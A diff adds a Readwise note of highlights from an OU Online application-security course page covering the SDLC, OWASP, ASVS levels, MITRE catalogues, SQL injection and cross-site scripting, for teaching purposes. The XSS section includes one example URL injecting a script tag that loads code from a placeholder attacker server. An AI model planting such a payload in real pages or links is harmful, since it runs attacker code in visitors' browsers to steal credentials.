@@ -1,0 +1,80 @@
+# þÿTopic 19   Application Security: View as Single Page | OU Online
+
+![rw-book-cover](https://readwise-assets.s3.amazonaws.com/media/reader/parsed_document_assets/298537943/IhCZZuzi3rpRSkjl-saqotf0pDlOgfem817rCL4_Vws-cove_IgR4HRU.png)
+
+## Metadata
+- Author: [[readwise.io]]
+- Full Title: þÿTopic 19   Application Security: View as Single Page | OU Online
+- Category: #articles
+- Summary: Application security (AppSec) focuses on identifying and fixing vulnerabilities in software to prevent cyber threats. It is essential for both developers and users to understand these security measures, as they help protect sensitive data and maintain software integrity. Resources like the OWASP Top Ten and Application Security Verification Standard (ASVS) provide guidance on best practices for secure coding and application development.
+- URL: https://readwise.io/reader/document_raw_content/298537943
+
+## Highlights
+- Application security (AppSec) is at its highest level the practice concerned with both identifying and removing vulnerabilities within software applications.
+- a key foundation of software design
+- part of the software development lifecycle (SDLC).
+- wider cybersecurity awareness has demanded a clearer, more attentive focus on preventative measures
+- s DevOps and CD/CI (continuous delivery/continuous integration)
+- an application is only part of the equation to provide a secure environment: there is a need to develop a secure environment or infrastructure
+- The application is a gateway between the end user and the organisational infrastructure;
+- n a possible target f
+- e is not only a financial component to wanting to ensure software is secure, but also to avoid irreparable brand damag
+- being involved in a data breach can lead to privacy concerns,
+- tasked with creating applications
+- Developers should adhere to a software development lifecycle (SDLC)
+- the engagement to obtain the requirements
+- Developers can further categorise requirements as either functional or non-functional.
+- the details of the project are documented, agreed and finalised
+- allows the effort to be planned
+- the point where the ‘go ahead’ is given
+- discuss design documentation, fine tuning it where needed, to ensure the vision of the application aligns with the requirements
+- Design documentation c
+- development team will raise concerns
+- d the more hands-on stage,
+- adhere to the necessary best practices
+- While testing is seen as a separate phase, developers should be employing testing practices along with developing the application.
+- e complex and requires lots of documentation
+- Repetition is vital at this stage to ensure that the tests and their results are repeatable
+- Before the application is made fully available, is it good practice to commission a beta release
+- Recently, game developers have begun to normalise the release of alpha and beta test phases
+- While the term ‘deployment’ can seem final, the truth is that software must be continuously maintained
+- The Open Worldwide Application Security Project (OWASP) is a non-profit organisation that is community led with individuals working towards a common goal – improving application security.
+- building a global community that secures software through education,
+- t OWASP have created a summative standard to help professionals get a quick glance of what security risks developers should be aware of
+- the names help developers to address at a high level what issues they need to be aware of
+- Level 1 is the basic expectation
+- Level 2 is more relevant to applications that deal with B2B
+- sensitive personal data.
+- Level 3 is the highest level
+- s military or critical infrastructur
+- It would be fair to assume that developers should be aiming to meet the requirements for Level 1 verification as a minimum
+- The standard is open source and covered by a creative commons license
+- it would be good practice to modify and adapt the standard on each use to suit the project.
+- Finally, why do you even need to use the standard at all? The simple answer is to help ensure the software you develop meets the required standards ensuring confidence
+- another well- known entity: MITRE.
+- CWE
+- community driven project that lists the more common software and hardware weaknesses f
+- he CVE (
+- known vulnerabilities to help catalogue and to act
+- for academics and security professionals
+- CAPEC
+- ) lists the more common and more importantly publicly known attack patterns to help security professionals to understand
+- Authentication and authorisation:
+- Logging: W
+- Encryption
+- Testing:
+- Data processing:
+- SQL injection (SQLi)
+- An SQL injection is a code-based injection method that is used to retrieve and modify data held within an SQL database
+- input SQL code into a text box that will query the database.
+- Cross-site scripting (XSS)
+- a client-side injection attack,
+- takes advantage of using malicious JavaScript code in the web browser to steal credentials or cause issues for the user navigating the website
+- visiting a website provided in a phishing email
+- visiting a website that contains malicious scripts activated
+- http://example.com/user?id=<script src="http:\\MY_WEBSERVER\SOME_BAD_SCRIPT.js"</script>
+- prevent this by sanitising and validating input b
+- Write effective comments
+- Use clear and concise variable and function names
+- Code indentation is crucial
+- DRY – Don’t Repeat Yourself.
